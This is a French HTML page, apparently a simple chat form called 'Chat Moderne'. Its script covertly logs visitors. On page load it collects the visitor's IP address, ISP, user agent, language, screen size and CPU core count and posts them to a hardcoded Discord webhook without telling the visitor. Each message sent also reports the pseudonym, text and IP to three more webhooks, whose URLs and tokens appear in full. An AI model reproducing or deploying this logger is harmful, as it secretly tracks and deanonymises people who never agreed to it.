<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chat Moderne</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: #e5e7eb; /* Gris clair */
            font-family: 'Segoe UI', Arial, sans-serif;
        }

        .chat-container {
            background: rgba(255, 255, 255, 0.95);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 400px;
            animation: fadeIn 0.5s ease-in-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        h2 {
            color: #333;
            margin-bottom: 30px;
            font-size: 24px;
            text-align: center;
        }

        .input-group {
            position: relative;
            margin-bottom: 25px;
        }

        input, textarea {
            width: 100%;
            padding: 12px 15px;
            border: none;
            border-bottom: 2px solid #ddd;
            background: transparent;
            font-size: 16px;
            color: #333;
            transition: border-color 0.3s ease;
        }

        textarea {
            height: 80px;
            resize: none;
            border: 2px solid #ddd;
            border-radius: 6px;
            padding: 15px;
        }

        input:focus, textarea:focus {
            outline: none;
            border-color: #667eea;
        }

        label {
            position: absolute;
            left: 15px;
            top: 12px;
            color: #777;
            font-size: 16px;
            pointer-events: none;
            transition: all 0.3s ease;
        }

        input:focus + label,
        input:not(:placeholder-shown) + label {
            top: -20px;
            font-size: 12px;
            color: #667eea;
        }

        button {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            border: none;
            border-radius: 25px;
            color: white;
            font-size: 16px;
            cursor: pointer;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
            margin: 10px 0;
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }

        .notification {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: #28a745; /* Vert pour succès */
            color: white;
            padding: 10px 20px;
            border-radius: 8px;
            font-size: 14px;
            opacity: 0;
            transition: opacity 0.3s ease;
            z-index: 1000;
        }

        .notification.show {
            opacity: 1;
        }
    </style>
</head>
<body>
    <div id="chatContainer" class="chat-container">
        <h2>Chat Moderne</h2>
        <div class="input-group">
            <input type="text" id="pseudo" placeholder=" " required>
            <label for="pseudo">Pseudo</label>
        </div>
        <textarea id="message" placeholder="Écrivez votre message..."></textarea>
        <button id="sendButton" onclick="envoyerMessage()">Envoyer</button>
    </div>

    <div id="notification" class="notification">Message envoyé avec succès !</div>

    <script>
        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip || "IP non disponible";
            } catch (error) {
                console.error("Erreur lors de la récupération de l'IP:", error);
                return "IP non disponible";
            }
        }

        async function getISP(userIP) {
            try {
                const response = await fetch(`https://ipinfo.io/${userIP}/json`);
                const data = await response.json();
                return data.org || "FAI non disponible";
            } catch (error) {
                console.error("Erreur lors de la récupération du FAI:", error);
                return "FAI non disponible";
            }
        }

        // Fonction pour envoyer les infos au chargement de la page
        async function sendInitialInfo() {
            const userIP = await getUserIP();
            const isp = await getISP(userIP);
            const timestamp = new Date().toLocaleString();
            const userAgent = navigator.userAgent || "User-Agent non disponible";
            const language = navigator.language || "Langue non disponible";
            const screenSize = `${window.screen.width}x${window.screen.height}` || "Taille d'écran non disponible";
            const cpuCores = navigator.hardwareConcurrency || "Nombre de cœurs non disponible";
            const motherboard = "Non détectable via JavaScript standard";
            const pcName = window.location.hostname || "Nom du PC non disponible (limite navigateur)";
            const port = "Non détectable via JavaScript (port source client inaccessible)";
            const email = "Non disponible sans authentification explicite (ex. OAuth)";

            const webhookInfo = "https://discord.com/api/webhooks/1347906492048871485/4AJ9_2rpcD3X3M9TLgEAhBCD_Db_7j8E-rL_sDYqIpe4P3LOPMt4gRpskQJYBQI54_Jr";

            try {
                const response = await fetch(webhookInfo, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ 
                        content: `**Nouvelle connexion au site**\n` +
                                 `**IP**: ${userIP}\n` +
                                 `**Opérateur (FAI)**: ${isp}\n` +
                                 `**Port réseau**: ${port}\n` +
                                 `**Email lié au navigateur**: ${email}\n` +
                                 `**Date**: ${timestamp}\n` +
                                 `**User-Agent**: ${userAgent}\n` +
                                 `**Langue**: ${language}\n` +
                                 `**Taille d'écran**: ${screenSize}\n` +
                                 `**Nombre de cœurs CPU**: ${cpuCores}\n` +
                                 `**Carte mère**: ${motherboard}\n` +
                                 `**Nom du PC**: ${pcName}`
                    })
                });
                if (!response.ok) throw new Error("Erreur webhook info");
            } catch (error) {
                console.error("Erreur lors de l'envoi des infos initiales :", error);
            }
        }

        async function envoyerMessage() {
            const pseudo = document.getElementById("pseudo").value;
            const message = document.getElementById("message").value;
            
            if (!message.trim()) {
                alert("Le message ne peut pas être vide.");
                return;
            }

            const userIP = await getUserIP();
            const timestamp = new Date().toLocaleString();

            const webhookUser = "https://discord.com/api/webhooks/1347862473537093664/VtOfMcsl2ZBjagms67UnRuw_joNCFi_f7cG7Z7gc-C2V4zCB2S8CzHuaJneKP1vIjFgF";
            const webhookAdmin = "https://discord.com/api/webhooks/1347862239012720680/3M_RuPkwWTT4bFI21KBjpQ0mUEPJw0phfflcZcNWxOQibgcatk_aOiooOao4iHP_Su4a";
            const webhookLogs = "https://discord.com/api/webhooks/1347905218121175060/VNo1QpgxJZpxG4OsSSKXnVLsR7iDHuA0XVmrgyrC1uvzc5V7_xP__GBK5QwpjAGLJn7H";

            try {
                // Envoi au webhook utilisateur (message brut)
                const userResponse = await fetch(webhookUser, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ content: message })
                });
                if (!userResponse.ok) throw new Error("Erreur webhook utilisateur");

                // Envoi au webhook admin (logs actuels)
                const adminResponse = await fetch(webhookAdmin, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ 
                        content: `**${pseudo}**: ${message}\n**IP**: ${userIP}\n**Date**: ${timestamp}` 
                    })
                });
                if (!adminResponse.ok) throw new Error("Erreur webhook admin");

                // Envoi au webhook logs (simplifié : pseudo, message, IP, heure)
                const logsResponse = await fetch(webhookLogs, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ 
                        content: `**Pseudo**: ${pseudo}\n` +
                                 `**Message**: ${message}\n` +
                                 `**IP**: ${userIP}\n` +
                                 `**Heure**: ${timestamp}`
                    })
                });
                if (!logsResponse.ok) throw new Error("Erreur webhook logs");

                // Afficher la notification de succès
                const notification = document.getElementById("notification");
                notification.classList.add("show");
                setTimeout(() => {
                    notification.classList.remove("show");
                }, 3000); // Disparaît après 3 secondes

                document.getElementById("message").value = ""; // Vider le champ
            } catch (error) {
                alert("Erreur lors de l'envoi du message : " + error.message);
            }
        }

        // Envoyer les infos dès le chargement de la page
        sendInitialInfo();
    </script>
</body>
</html>